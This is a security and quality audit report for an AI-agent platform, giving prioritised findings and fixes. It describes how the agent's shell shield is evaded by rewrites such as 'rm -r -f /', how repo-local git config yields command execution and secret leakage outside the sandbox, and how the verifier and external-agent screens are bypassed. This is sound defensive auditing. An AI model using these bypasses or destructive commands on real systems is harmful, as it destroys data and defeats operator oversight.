# Lightwork — Platform Improvement Audit (September 2026)

> Base commit `2d75929` on `main` · branch `claude/platform-improvements-audit-8swoq2` · prepared 2026-09-07.
> Companion to `CODE_QUALITY_AUDIT.md` (June 2026) and `ADVERSARY_COUNCIL_REVIEW.md` (July 2026).

## What this is

A whole-platform sweep for things that can be improved: security flaws, correctness and reliability bugs,
data-integrity risks, claims the code does not deliver, maintainability hotspots, test gaps, deployment and
supply-chain risks, and concrete product/DX opportunities. The mandate was "find any and all things we can
improve — max out everything", so the net is deliberately wide: 538 items are listed, from one critical
finding down to low-severity polish and 37 non-defect improvement ideas.

## How to read it — and the one caveat that matters

Every finding was produced by a dedicated auditor working one dimension of the platform (the kernel turn loop,
the Postgres backend, dashboard auth, the shield rules, Terraform, and so on), and every finding cites a
repository path, a line number the auditor read, and a verbatim evidence quote. Auditors were told to report
only what they had verified in the code or by running something, to check the prior audit documents first, and
to give a `verification_hint` a skeptic can use.

**The planned second stage — an independent skeptic re-reading each finding and two adversarial refuters for
every high/critical — did not run.** The session's usage cap was reached mid-run and the owner asked to close
out with what had been collected. So the statuses below mean:

- **Raised** — the finder cited evidence at file:line; nobody else has re-read it yet. Treat as a high-quality
  worklist item, not an established fact. Where the finder ran a probe or test (many did — see Appendix D), the
  evidence is correspondingly stronger.
- **Confirmed (spot-check)** — re-read by hand during close-out against HEAD and the claim matches the code.
- **Contested (spot-check)** — the hand re-read found something the finder's claim does not account for.

Twenty-six of the fifty-one planned dimensions completed. The twenty-five that did not (listed in Appendix D)
are real coverage gaps — the tool catalog past `f`, channels, the MCP server, the learning loop, plugins,
performance, config/wizard parity, first-run onboarding, API contracts, observability, i18n, the TypeScript/Go/Rust
components, the non-CLI apps, dependency health, licensing, benchmarks, roughly 200 core modules, the domain packs,
and the regression check of the two earlier audits. This document should be read as the first half of the sweep.

## Baseline at HEAD

| Check | Result |
|---|---|
| `python3 -m pytest -q -n 4 --dist loadfile -m "not heavy_concurrency"` | 26,145 passed · 6 failed · 249 skipped · 3 xfailed · 7m50s on 4 cores |
| The 6 failures | all caused by the audit container exporting `ANTHROPIC_BASE_URL`; the tests assume no provider env var is set (see W5 tests-quality) |
| `python -m ruff check .` / `python -m vulture` | clean |
| Repository size | ~600k non-test Python LOC in `maverick-core`, ~150k in `maverick-dashboard`, 2,031 domain packs, ~1,950 test files |

## Findings at a glance

| Severity | Retained | of which known-open from a prior audit |
|---|---|---|
| critical | 1 | 0 |
| high | 42 | 1 |
| medium | 214 | 17 |
| low | 244 | 26 |
| improvement | 37 | 3 |
| **total** | **538** | **47** |

Raised by finders: 561 · after de-duplication: 538 · refuted or killed by verifiers: 0 · could not be verified in time: 0.

| Category | Retained |
|---|---|
| security | 90 |
| correctness | 71 |
| reliability | 68 |
| docs-accuracy | 64 |
| performance | 35 |
| testing | 29 |
| dx | 26 |
| maintainability | 25 |
| ux | 23 |
| data-integrity | 22 |
| ops | 21 |
| supply-chain | 13 |
| duplication | 12 |
| compliance | 10 |
| dead-code | 10 |
| product | 10 |
| concurrency | 9 |

## Headline

The kernel controls that earlier audits praised still hold: the finders found no `shell=True` outside the
sandbox, no string-built SQL reaching user input, every mutating dashboard route behind an RBAC guard, no
non-constant-time secret comparisons, no `random` used for tokens, hardened `eval`/archive/XML paths, and a CI
lint job with sixteen bespoke gates. Most of what follows is not "the platform is fake"; it is "the guarantees
stop at specific edges, and those edges are reachable."

The eight places where improvement matters most, in the order to take them:

1. **Host-side git is outside the sandbox.** The reviewer and edit-format paths run `git diff` on the host with
   the full environment (`env={**os.environ, ...}`, and `get_diff` with no env at all), the `write_file` tool can
   write under `.git/` in normal mode, and coding-mode candidate evaluation runs `git worktree add` / `reset --hard`
   on the host. A repo-local `core.fsmonitor` or filter therefore executes attacker- or agent-controlled commands
   with the operator's provider keys in the environment. W2-1 (the one critical), W2-2, W2-3, W2-4. Fix: run
   these through `sandbox.exec()` with `scrub_env`, pass `-c core.fsmonitor=false -c core.hooksPath=/dev/null`
   and `GIT_CONFIG_NOSYSTEM`, and make `.git/` write-protected for `write_file` everywhere.
2. **The Postgres (HA) backend is a second-class world model.** `search_goals` ignores `owner`, `create_goal`
   lacks `domain`/`project_id`, `total_spend` takes no owner, and RLS is never checked against `SUPERUSER` /
   `BYPASSRLS` on the connection role. Every one of these is a `TypeError`, a 500, or a silent cross-user read on
   the backend the enterprise docs recommend. W1-46, W1-47, W1-48, W2-68 plus nine more in `core/world_model_backends`.
   Fix: a signature-parity test that introspects both classes (the finder's scratch script does exactly this) and
   a role preflight in `pg_rls`.
3. **Egress guarantees have named holes.** The `websocket` and `browser` (Playwright) tools sit outside both the
   process-wide egress guard and the enterprise egress lock; the per-tenant egress plane is consulted by one of
   seventy-three network tools; `maverick airgap check` can print "clean" with the guard off; and the SSRF-pinned
   `guarded_urlopen` breaks behind any private-address proxy. W2-69, W2-87, W2-88, W2-90, W2-94. The
   `egress_contract` CI gate needs `websockets` and Playwright added to its wrapped set.
4. **Two verifier bypasses in the agent loop.** A text-only reply with no `FINAL:` marker is accepted as the final
   answer at `verifier_confidence=1.0`, and domain-routed goals (packs, `--domain`) skip FINAL verification, the
   review checkpoint and the thinking budget because the root agent's role is not `orchestrator`. The dashboard
   Cancel button also never stops a running goal. W1-25, W1-24, W1-23 — the finder reproduced all three with
   FakeLLM tests (`scratchpad/audit/work/kernel-agent-loop/test_repro.py`).
5. **Shield rules advertised in the docs are bypassed by trivial rewrites** (`rm -r -f /`, split chmod flags),
   the external-agent screen reads `verdict.blocked` on a `ShieldVerdict` that only has `allowed` (so it never
   blocks — confirmed by hand), and `MAVERICK_KMS_KEK` is not in the sandbox scrub set. W2-33, W2-32, W2-45.
6. **Production deploy has no safety rails where it needs them.** RDS with `deletion_protection=false` and
   `skip_final_snapshot=true`, ECS "rollback" onto a mutable `:latest` tag whose previous image ECR expires, the
   demo printing a `?token=` URL the dashboard removed (confirmed: `app.py:1932`), release tags re-pointed
   after signing, and a committed branch ruleset that the finder's GitHub API checks say is not what the live
   repository enforces. W5-28, W5-29, W5-27, W5-2, W5-1.
7. **The dashboard event loop is blocked by design.** 469 of 1,894 async route handlers never `await` and run
   SQLite work inline; 29 tenant suite APIs return 401 to static-bearer and auth-off callers that sibling suites
   accept; a backup archive bundles the at-rest key next to the sealed DB; restore has no live-process guard.
   W1-69, W3-1, W1-45, W1-51.
8. **The governance suites were built in bulk and it shows.** Sixty-one copies of `_StrictModel`, forty-eight of
   `_tenant_id`, per-module helper families that have drifted, an evidence ledger that re-verifies its whole
   segment on every append (measured 64 ms → 237 ms and climbing), a reservation that wedges a conversation
   forever after one failed delivery, and `unified_audit_records` raising permanently once a tenant unlinks a
   profile. W4-28, W4-29, W4-1, W3-2 and the duplication items in Appendix A.

Then the long tail: 214 medium items (a third of them documentation that contradicts the code, including
`ARCHITECTURE.md` still saying migrations run "v1 → v23" when the head is 33, and `AGENTS.md` saying bugbear is
"deliberately off" when `pyproject.toml` enables it repo-wide), 244 low items, and 37 improvement ideas.

## Cross-cutting patterns

- **Guarantee edges.** The same shape recurs across security, egress, tenancy and audit: a control is real on the
  main path and absent on a sibling path (websocket vs http_fetch; SQLite vs Postgres; orchestrator role vs domain
  role; opaque benchmark mode vs normal mode for `.git/` writes). The cheapest systemic fix is a parity test per
  family — the finders' scratch scripts for route guards, backend signatures and egress wrapping are ready to be
  turned into CI gates alongside the sixteen that exist.
- **Docs ahead of code.** 64 docs-accuracy items. Counts, schema versions, "shipped" labels and command names drift
  because nothing checks them; a docs gate that greps `maverick <cmd>` invocations and numeric claims would hold the
  line (several finders built exactly that script).
- **Bulk-built suites.** Duplication (12), dead code (10) and a share of the reliability items concentrate in the
  `ai_*`, `consent_*`, `privacy_*`, `third_party_*` and GRC modules. The helpers to consolidate are enumerated with
  counts in Appendix A.
- **Host vs sandbox.** Everything a tool does through `sandbox.exec()` is scrubbed and confined; several host-side
  conveniences (git diff for review, worktree evaluation, backup/restore) are not. Route them through the same
  chokepoint rather than re-hardening each one.
- **Operational defaults.** Terraform and Helm are valid and lint-clean but tuned for a demo: no deletion
  protection, mutable tags, root-ish pods, ServiceAccount tokens mounted into sandbox pods. Fifteen items in
  `deploy/terraform` alone.

## Critical and high findings

| ID | Sev | Status | Area | Location | Finding | Fix | Effort |
|---|---|---|---|---|---|---|---|
| W2-1 | **critical** | Confirmed (hand spot-check at close-out) | core/coding | `packages/maverick-core/maverick/edit_format.py:670` | Repo-local git config (core.fsmonitor / filter smudge) executes arbitrary commands during host-side git diff — agent- or repo-controlled RCE + secret exfiltration | Route every host-side git invocation in edit_format.py, reviewer.py and coding_mode.py through the same hardening orchestrator.py already uses: (1) run under `_git_env_without_user_config()` (GIT_CONFIG_GLOBAL/SYSTEM=devnull, GIT_CONFIG_COUNT overrides for core.fsmonitor=false) AND scrub_env() so no provider secret is in the child env; (2) call `_git_metadata_may_execute_filters(wd)` and refuse when true; (3) unconditionally block writes under `.git/` in tools/fs.py (not only in opaque benchmark mode). Add `-c core.fsmonitor=false -c core.hooksPath=/dev/null` to the argv as belt-and-suspenders. | M |
| W4-29 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/ai_evidence_gateway | `packages/maverick-core/maverick/ai_evidence_gateway.py:1365` | A delivery that fails after the conversation reservation permanently blocks every later turn of that conversation (no abandon/expiry path) | Either (a) wrap render+sign in try/except and clear the reservation (compare-and-swap on the same receipt_id) on failure, or (b) add a bounded reservation TTL: when `pending.issued_at` is older than N seconds and no signed row exists for pending.receipt_id in the ledger, allow a new reservation to supersede it (recording the abandoned receipt_id in the audit trail). Add an operator API to abandon a pending reservation, and a test for the failure-then-new-key sequence. | M |
| W4-28 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/ai_evidence_ledger | `packages/maverick-core/maverick/ai_evidence_ledger.py:1780` | Segmented receipt ledger re-verifies the whole active segment on every append (O(n) per delivery, measured 64 ms -> 237 ms and climbing) | After AuditSigner.write, verify only the newly appended tail: read the last line, check prev_hash == state.active_segment_tip, hash/signature of that one row, and use the known row count from the authenticated state (+1) instead of _verify_file(segment_path). Keep full-segment verification for rebuild/verify_integrity paths. Add a regression test asserting append cost is independent of segment size (e.g. time 50 appends at row 10 vs row 3,000). | M |
| W2-90 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/air_gap | `packages/maverick-core/maverick/air_gap.py:88` | `maverick airgap check` can report 'clean' while the process-wide egress guard is off: it checks [egress] deny=['*'] (enforced by ~15 modules) but never [enterprise] mode, which is what egress_guard actually enforces | Add a violation when enterprise mode is not on for the audited config (config['enterprise']['mode'] is not True and MAVERICK_ENTERPRISE not truthy and no compliance floor requiring FLOOR_EGRESS_LOCK), and when [enterprise] allowed_hosts is non-empty; alternatively make egress_guard._denied also apply tenant.egress.host_allowed so [egress] deny=['*'] is enforced at the seam. Update test_air_gap.py fixtures accordingly. | S |
| W4-59 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/assessment | `packages/maverick-core/maverick/assessment.py:4996` | assessment.list_saved() crashes once the sibling assessments.py register exists in the same data directory | Give assessments.py its own subdirectory (e.g. data_dir("assessment_register")) or reserve the stems 'register' and 'templates' in assessment.py's glob (skip them explicitly). Additionally make list_saved() skip-and-log a record whose id does not match its filename instead of raising, so one foreign/corrupt file cannot take down every listing endpoint. Add a regression test that writes register.json and templates.json into the shared dir and asserts list_saved() still works. | S |
| W2-46 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/audit signing | `packages/maverick-core/maverick/audit/signing.py:345` | Audit signing key is a general-purpose signing oracle: detached-digest and federation-envelope signatures are byte-compatible with audit rows, so forged rows verify clean | Domain-separate every non-row use of the audit key: sign_detached_digest should sign b'maverick-detached-digest/v1\x00'+digest (and verifiers must expect it); sign_envelope should sign a 'maverick-federation-envelope/v1' prefixed message; ideally AuditSigner rows should also sign a versioned prefix + hash (new key_id/format version so old rows keep verifying). Add a regression test that a detached signature never verifies as an audit row. | M |
| W1-45 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/backup | `packages/maverick-core/maverick/backup.py:664` | DR backup archive bundles the at-rest encryption key next to the sealed world.db | Exclude `keys/` (at_rest.key, at_rest.d/, audit signing keys) from _excluded_from_snapshot() by default and add an explicit `--include-keys` flag that prints a loud warning; better, seal the whole payload (or the manifest-listed sensitive files) under a backup-specific key derived from MAVERICK_BACKUP_SIGNING_KEY so the archive is confidential as well as authenticated. Document that key escrow is a separate step and add a test asserting no *.key member appears in a default archive. | S |
| W1-51 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/backup | `packages/maverick-core/maverick/backup.py:1161` | restore_backup has no live-process guard: restoring while the dashboard/agent holds world.db open silently loses every subsequent write | Before applying, take the world's own cross_process_lock(world.db) and refuse when it is held / when a WAL or SHM sidecar exists with recent mtime, or add an explicit `--i-stopped-the-service` acknowledgement; at minimum document 'stop maverick serve / dashboard before restore' in the CLI help and operations.md, and have WorldModel detect inode change on its connection (fstat vs stat) and reopen. | M |
| W2-4 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/coding | `packages/maverick-core/maverick/coding_mode.py:2040` | coding_mode candidate evaluation runs `git worktree add` / `reset --hard` on the host with no filter guard or env scrub | Apply the orchestrator hardening (filter-metadata guard + scrubbed, config-neutralised env) to every git call in _evaluate_candidate, or perform candidate application through sandbox.exec on a non-host backend. At minimum add `-c core.fsmonitor=false` and refuse when _git_metadata_may_execute_filters(workdir) is true. | M |
| W2-2 | **high** | Confirmed (hand spot-check at close-out) | core/coding | `packages/maverick-core/maverick/reviewer.py:159` | render_diff / get_diff leak the full host environment (provider API keys) into git subprocesses | Pass `env=scrub_env()` (or scrub_child_env()) to every host git subprocess in reviewer.py and edit_format.py, matching tools/git_advanced.py and tools/preview_diff.py which already scrub. Set GIT_PAGER="" and GIT_CONFIG_GLOBAL/SYSTEM=os.devnull as those helpers do. | S |
| W4-1 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/consent_preferences | `packages/maverick-core/maverick/consent_preferences.py:3721` | unified_audit_records raises permanently for any tenant that has unlinked a profile (Operating Record capture breaks) | Add "profile.unlinked": "relationship_changed" (or a dedicated action) to the actions map in unified_audit_records; add a regression test that links, unlinks, then calls unified_audit_records. Consider making the map a module constant shared with _outbox event_type validation so new outbox event types cannot be added without an audit mapping. | S |
| W2-32 | **high** | Confirmed (hand spot-check at close-out) | core/external_agents | `packages/maverick-core/maverick/external_agents.py:1053` | External-agent/federation shield screen never blocks: verdict.blocked read on a ShieldVerdict that has no such attribute | Replace `getattr(verdict, "blocked", False)` with `not getattr(verdict, "allowed", True)` at external_agents.py:291, 1053, 1421 (and audit any other `.blocked` reads). Add a unit test that feeds a known-blocking payload through _sanitize/the action gate and asserts denial. Consider giving ShieldVerdict a `blocked` property alias to make the two spellings equivalent and prevent recurrence. | S |
| W1-2 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/llm circuit breaker | `packages/maverick-core/maverick/llm.py:1450` | Budget exhaustion and client-side 400s trip the provider circuit breaker, fast-failing every other goal/tenant in the process for 30s | Feed the breaker only with provider-transport outcomes: classify the exception before _feed_circuit and record a failure only for 429/5xx/timeout/connection classes (reuse retry._is_retryable_status_error / failover_policy.classify_error), never for BudgetExceeded, ModelNotAllowedError, PreflightFailed, EgressBlocked or 4xx. Consider keying the breaker by (provider, base_url/tenant) so one tenant's quota problem cannot open another's circuit. | S |
| W1-3 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/llm model catalog | `packages/maverick-core/maverick/llm.py:47` | Catalogued model 'claude-opus-4-8-fast' is a phantom id sent verbatim to the API; fast mode needs speed='fast' + beta header and cannot work | In AnthropicClient._build_request, map MODEL_OPUS_FAST to model='claude-opus-4-8' + speed='fast' + the fast-mode beta (routing through client.beta.messages), or remove the SKU from MODEL_CATALOG/wizard until implemented. Add a request-shape test that asserts the outbound `model` never contains '-fast'. Note fast mode is unavailable on Bedrock/Vertex/Foundry and has its own rate limit; fall back to standard Opus on 429. | S |
| W1-1 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/llm pricing gate | `packages/maverick-core/maverick/llm.py:1437` | Default strict pricing refuses every Azure/Bedrock/openai_compatible/Moonshot/OpenRouter call BEFORE dispatch, even with no budget | Separate the pre-dispatch *estimate* from the post-response *bill*: call _estimate_call_cost with estimate_only=True (it is a hold/projection, not an invoice) and only require a verified rate in Budget.record_tokens. For providers whose ids are structurally unpriceable (azure deployment names, bedrock, openai_compatible) add a per-provider `[providers.<name>] price_in/price_out` knob that produces a verified-by-operator ModelPrice, and surface the strict-pricing refusal in `maverick doctor` / the model picker instead of at call time. Remove unverified models from MODEL_CATALOG or badge them 'estimate-only'. | M |
| W2-45 | **high** | Confirmed (hand spot-check at close-out) | core/sandbox + tenant/kms | `packages/maverick-core/maverick/sandbox/local.py:22` | MAVERICK_KMS_KEK (tenant DEK wrapping key) is not scrubbed from the sandbox shell environment | Add `KEK` (and `SALT`, `SEED`, `SIGNING`) to _SECRET_ENV_RE, and add MAVERICK_KMS_KEK / MAVERICK_ENCRYPTION_KEY / MAVERICK_AUDIT_SIGNING_KEY_WRAPPED to _ALWAYS_STRIP_ENV as explicit records; add a test that every secret-bearing env name in docs/env-vars.md is stripped by scrub_env. | S |
| W2-69 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/tenant/egress | `packages/maverick-core/maverick/tenant/egress.py:4` | Per-tenant egress plane is consulted by exactly one of 73 network tools; docstring claims it applies to every tool | Hook the tenant plane into egress_guard's one-request seam (call tenant.egress.host_allowed(host) alongside egress_permitted for the active tenant via current_tenant_id()), or delete the 'every tool' claim and document it as http_fetch-only. Add an egress_contract-style CI assertion that the wrapped seam consults tenant.egress. Until then, remove the claim from the docstring and docs/multi-tenancy.md. | M |
| W2-3 | **high** | Confirmed (hand spot-check at close-out) | core/tools | `packages/maverick-core/maverick/tools/fs.py:199` | write_file allows writing under .git/ outside benchmark opaque mode (enables git-config hook injection) | In _safe_resolve / write_text_contained, unconditionally refuse any resolved path containing a `.git` segment for WRITES (keep the opaque-mode read block as-is). This closes the config-injection path even if a host git call is missed. | S |
| W2-88 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/tools/browser | `packages/maverick-core/maverick/tools/browser.py:342` | browser tool (Playwright) is outside both the process-wide egress guard and the enterprise/tenant egress checks | Gate _browser_navigate/_browser_go_back/_browser_go_forward/click on enterprise.enterprise_egress_denial(url, tool='browser') and tenant.egress.egress_allowed('browser', host); additionally register a Playwright page.route('**/*') handler that aborts any request whose host fails egress_permitted/is_blocked_host (this also fixes the post-hoc redirect problem in the next finding). Document the browser as outside the HTTP seam in egress_guard's module docstring and enterprise.py's 'what it still does not cover' list. | M |
| W2-94 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/tools/http_fetch (urllib path) | `packages/maverick-core/maverick/tools/http_fetch.py:321` | guarded_urlopen breaks behind any HTTP(S) proxy on a private/loopback address: the pinned connection refuses the proxy host (reproduced on this box) | In _make_pinned_connect, detect proxied requests (self._tunnel_host is set, or req.host != urlparse(req.full_url).hostname) and skip pinning of the proxy hop (the target was already validated by _check_url_allowed; the proxy is operator-trusted), or explicitly pass ProxyHandler({}) to disable proxies for this opener and document that guarded fetches ignore proxies (matching safe_client). Add a regression test that sets HTTPS_PROXY to a 127.0.0.1 address and asserts guarded_urlopen does not raise BlockedHost-style errors. | S |
| W2-87 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/tools/websocket | `packages/maverick-core/maverick/tools/websocket_tool.py:85` | websocket tool bypasses the enterprise tool-egress lock entirely (websockets library is not wrapped, no enterprise_egress_denial call) | In _run(), before resolve_pinned_ip, call enterprise.enterprise_egress_denial(url.replace('ws','http',1), tool='websocket') and tenant.egress.egress_allowed('websocket', host) and return the ERROR string on denial; add 'websockets.connect' to egress_contract._HTTP_CALLS mapped to a library that is NOT in COVERED_LIBRARIES so the module is recorded in KNOWN_UNCOVERED; add a test in test_enterprise_tool_egress.py that enables enterprise mode and asserts the websocket tool refuses a public host. | S |
| W1-52 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/world_model | `packages/maverick-core/maverick/world_model.py:1213` | Per-thread SQLite reader connections are retained for the life of the WorldModel: short-lived threads leak a connection and two FDs each | Track reader connections with weakref/finalizers keyed on thread liveness: store them in a dict keyed by thread ident and prune entries whose thread is no longer alive on each _reader() call (or use a small bounded pool of reader connections handed out under a lock instead of thread-locals). Add a regression test that spawns N short-lived threads and asserts len(_reader_conns) stays bounded. | S |
| W1-46 | **high** | Confirmed (hand spot-check at close-out) | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:1588` | Postgres search_goals ignores the owner filter: non-admin dashboard search returns every user's goals on the HA backend | Add `owner = %s` to both the sealed scan-then-decrypt branch and the ILIKE branch of PostgresWorldModel.search_goals when owner is not None (mirror list_goals which already does), and add a Postgres-marked test that a second owner's goal is not returned. | S |
| W1-48 | **high** | Confirmed (hand spot-check at close-out) | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:2619` | PostgresWorldModel.total_spend takes no owner argument: /api/v1/spend and external-agent records 500 on Postgres | Add `owner: str \| None = None` to PostgresWorldModel.total_spend and add `AND g.owner = %s` (join goals already happens when a tenant is active; always join when owner is given). Cover with a parity test. | S |
| W1-47 | **high** | Plausible (hand spot-check; see note) | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:1352` | PostgresWorldModel.create_goal has no domain/project_id kwargs: checkpoint sub-goal spawning and the finance CLI raise TypeError on Postgres | Add `domain: str = ""` and `project_id: int \| None = None` to PostgresWorldModel.create_goal (the columns already exist via migrations v14/v15) and write them in the INSERT; add domain/project_id to PGGoal and _dec_goal_row. Add a signature-parity test (inspect.signature over the shared public surface) so the two backends cannot drift again. | S |
| W2-68 | **high** | Raised (finder cited evidence; skeptic pass not run) | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:1262` | Postgres RLS never checks the connection role for SUPERUSER/BYPASSRLS, so 'fail-closed' isolation is silently void under a privileged DSN | In PostgresWorldModel.__init__ when self._rls is true (and in pg_rls.preflight), run `SELECT rolsuper, rolbypassrls FROM pg_roles WHERE rolname = current_user` and raise RuntimeError('RLS cannot be enforced for a SUPERUSER/BYPASSRLS role') -- mirror governed_records._schema_status_on. Report it as a `ready=False` reason in `maverick tenant rls-preflight`. Add `NOSUPERUSER NOBYPASSRLS` to the CREATE ROLE snippet in deploy/postgres/README.md and a doctor check. | S |
| W1-69 | **high** | Raised (finder cited evidence; skeptic pass not run) | dashboard/api + app | `packages/maverick-dashboard/maverick_dashboard/api.py:1485` | 469 of 1,894 dashboard async route handlers never await and run synchronous SQLite/world work directly on the event loop | Mechanically convert zero-await route handlers to plain `def` (FastAPI will threadpool them) or wrap world/store calls in run_in_threadpool; add a CI gate in the style of the existing custom gates (a2a/a11y) that fails on a route-decorated `async def` with no await whose body calls _world()/sqlite. The scan script at scratch/audit/work/concurrency-reliability/scan_async_routes.py can seed the gate. | M |
| W2-8 | **high** | Raised (finder cited evidence; skeptic pass not run) | dashboard/auth (proxy SSO) | `packages/maverick-core/maverick/proxy_auth.py:86` | Reverse-proxy SSO identity can be spoofed by any loopback peer via X-Forwarded-For under uvicorn's default proxy-header handling | Make the transport peer authoritative for proxy_trusts: launch uvicorn with proxy_headers=False (or forwarded_allow_ips=[] ) whenever [auth.proxy] is enabled, or have proxy_trusts read the raw socket peer (e.g. keep it on scope['server']/transport before uvicorn rewrites, or set forwarded_allow_ips from trusted_proxies so only the pinned proxy may assert XFF). Add an ASGI-level regression test that wraps app in uvicorn.middleware.proxy_headers.ProxyHeadersMiddleware(trusted_hosts='127.0.0.1') and asserts a loopback peer with X-Forwarded-For=<pinned> is refused. Document FORWARDED_ALLOW_IPS in docs/security-hardening.md. | S |
| W3-18 | **high** | Plausible (hand spot-check; see note) | dashboard/settings_store + api features/switches | `packages/maverick-dashboard/maverick_dashboard/settings_store.py:441` | In-app feature switches for fleet_memory and entity_graph never persist: settings_store._dump allowlist silently drops both sections and the API returns a misleading 409 | Add 'fleet_memory' and 'entity_graph' (and generally every entry of SWITCHABLE_SECTIONS) to the _dump section list — e.g. `for section in dict.fromkeys((..., *SWITCHABLE_SECTIONS, *_LEARNING_SECTIONS, *_MODULE_TOP_SECTIONS))` — and add a parametrized round-trip test over SWITCHABLE_SECTIONS asserting load_overlay()[section]['enable'] after set_section_enable(). Consider making _dump fail loudly (log.error or raise) when a top-level key it does not know how to serialise is present instead of dropping it. | S |
| W3-1 | **high** | Raised (finder cited evidence; skeptic pass not run) | dashboard/suite-apis (identity) | `packages/maverick-dashboard/maverick_dashboard/third_party_lifecycle_api.py:266` | 29 tenant suite APIs return 401 for static-bearer and local auth-off callers while sibling suites accept them (principal-derivation divergence) | Decide the contract once: either (a) accept static-bearer/local callers as a stable synthetic operator principal (as third_party_intelligence_api does) or (b) require a named principal everywhere and make the paired page routers return the same 401/409 with guidance. Implement it in ONE shared helper (e.g. _shared.principal_ref(request, tenant_id, namespace)) and replace the 22 _principal + 14 _principal_ref copies. Add a parametrized test that hits every suite's /status route under static-bearer and auth-off modes and asserts one consistent outcome. | M |
| W5-27 | **high** | Confirmed (hand spot-check at close-out) | deploy/demo | `deploy/demo/run-demo.sh:50` | One-command demo prints a ?token= URL that the dashboard rejects with 401 | Update run-demo.sh to print the plain URL plus the token and instructions (Bearer header / OIDC or invite flow), and rewrite deploy/demo/README.md lines 10-12, 27-30, 45-47, 54-65 to match fly.toml/render.yaml. Better: add a minimal browser login form (or a cookie exchange endpoint) so a demo audience can use a link at all; the demo-cluster nginx-inject pattern is the current workaround. | S |
| W5-29 | **high** | Raised (finder cited evidence; skeptic pass not run) | deploy/terraform | `deploy/aws/terraform/ecs.tf:141` | ECS circuit-breaker 'rollback' cannot roll back: image tag is mutable :latest and ECR expires the previous image | Make CodeBuild tag images by git SHA (IMAGE_TAG=sha-<commit>), set image_tag_mutability = "IMMUTABLE", pass the SHA tag into the task definition on each apply (or use the image digest), keep a count-based ECR lifecycle rule (e.g. keep last 10 tagged), and update the ecs.tf comment/NEXT_STEPS.md deploy procedure accordingly. | M |
| W5-28 | **high** | Confirmed (hand spot-check at close-out) | deploy/terraform | `deploy/aws/terraform/rds.tf:28` | Production RDS has deletion_protection=false and skip_final_snapshot=true | Set deletion_protection = true, skip_final_snapshot = false with final_snapshot_identifier, add lifecycle { prevent_destroy = true } to aws_db_instance.main, and consider multi_az = true and copy_tags_to_snapshot = true. Document the one-time override path for intentional teardown. | S |
| W1-24 | **high** | Raised (finder cited evidence; skeptic pass not run) | kernel/agent-loop | `packages/maverick-core/maverick/agent.py:3818` | Domain-routed goals (packs / --domain) skip FINAL verification, the review checkpoint and the thinking budget because the root agent's role is the pack name, not 'orchestrator' | Introduce an explicit `is_root` predicate (depth == 0 and parent is None) and use it instead of `role == "orchestrator"` for verification, review checkpoint, thinking budget, prewarm and template selection (or set a separate `self.kind = 'root'` in agent_from_profile when depth == 0). Add a test that a domain-routed run_goal invokes verify_final. | S |
| W1-25 | **high** | Raised (finder cited evidence; skeptic pass not run) | kernel/agent-loop | `packages/maverick-core/maverick/agent.py:4176` | A text-only response without a FINAL: marker is accepted as the final answer with verifier_confidence=1.0, bypassing the verifier, coding-mode apply-check, STOP hooks and the run record | Route the no-tool-call text branch through the same FINAL handling: treat a text-only end_turn response as `final = resp.text` (optionally after one nudge 'end with FINAL:') so verification, patch validation, hooks and record writes apply; report verifier_confidence honestly (0.0/'not verified') when verification did not run. Add a loop test where the scripted answer lacks the marker and assert verify_final is invoked. | S |
| W1-23 | **high** | Raised (finder cited evidence; skeptic pass not run) | kernel/agent-loop + dashboard/api | `packages/maverick-dashboard/maverick_dashboard/api.py:9090` | Dashboard 'Cancel' never stops a running goal: the agent loop never reads goal status, contrary to the endpoint docstring | Add a goal-scoped stop check to the turn-boundary gate in Agent._run_inner (next to killswitch.check()/budget.check() at agent.py:3441-3450) and to the per-tool halt check at agent.py:4310, throttled like _mirror_live_spend (read world.get_goal(goal_id).status every ~1-5s) and returning AgentResult(error='cancelled'); or have cancel_goal arm a per-goal entry in the killswitch halt table that killswitch.check() consults with a goal_id scope. Fix the docstring either way and add a test that cancels mid-run and asserts no further LLM calls. | S |
| W5-2 | **high** | Raised (finder cited evidence; skeptic pass not run) | release/provenance | `deploy/verify-release.sh:47` | Release tags are mutable (no tag ruleset): v0.1.6 was re-pointed three times and keyless signatures bind only to the tag name | Add a second ruleset file (e.g. .github/rulesets/protect-release-tags.json, target 'tag', include refs/tags/v* and native-v*/desktop-v*) with deletion, non_fast_forward and update restrictions, import it, and extend test_the_ruleset_requires_every_blocking_check_and_the_queue to assert it exists. Enable GitHub's immutable-releases repository setting. Consider embedding the source SHA in verification (e.g. verify-release.sh also checks the certificate's source-repository-digest extension against the release's maverick-container-*.json source_revision). | S |
| W5-1 | **high** | Raised (finder cited evidence; skeptic pass not run) | repo-governance/rulesets | `.github/rulesets/protect-main.json:4` | Committed branch ruleset is not what the live repo enforces: PRs merge before required checks finish and the merge queue has never run | Re-import .github/rulesets/protect-main.json in Settings > Rules > Rulesets (or fix whatever bypass/disabled state exists), then add a scheduled workflow (e.g. weekly, plus on changes to the JSON) that runs `gh api repos/$GITHUB_REPOSITORY/rulesets` + `/rulesets/{id}` with a read-only token and diffs the live rule set against the committed file, failing (and opening an issue) on drift. Also fix the 'required check passes in 4s on PR' pattern only after the queue is actually enforced, otherwise `test (3.11, n)`/`posture (n)` are green stubs on every PR with nothing ever running them before merge. | S |
